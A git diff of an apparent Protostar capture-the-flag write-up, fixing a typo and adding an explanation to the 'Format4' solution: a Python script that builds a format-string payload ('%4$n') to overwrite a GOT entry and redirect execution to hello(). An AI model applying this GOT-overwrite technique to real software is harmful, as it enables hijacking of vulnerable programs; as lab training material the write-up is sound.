@@ -20,13 +20,15 @@ Vulnerabilities
 
 ### 0x13 Format4
 
-Answer 1: `python exploiy.py | /opt/protostar/bin/format4`
+We need to use format strings to write to GOT table (the one that PLT references to)
+
+Answer 1: `python exploit.py | /opt/protostar/bin/format4`
 
 ```
 import struct
 
 redirect = struct.pack("I", 0x80484b4) #address to hello() which we want redirect to
-overwrite = struct.pack("I", 0x8049724) #address in GOT  we want to overwrite
+overwrite = struct.pack("I", 0x8049724) #address in GOT we want to overwrite
 
 exploit = ""
 exploit += overwrite
@@ -36,7 +38,7 @@ exploit += "%4$n"
 print exploit
 ```
 
-Answer 2: `python exploiy.py | /opt/protostar/bin/format4`
+Answer 2: `python exploit.py | /opt/protostar/bin/format4`
 
 ```
 import struct
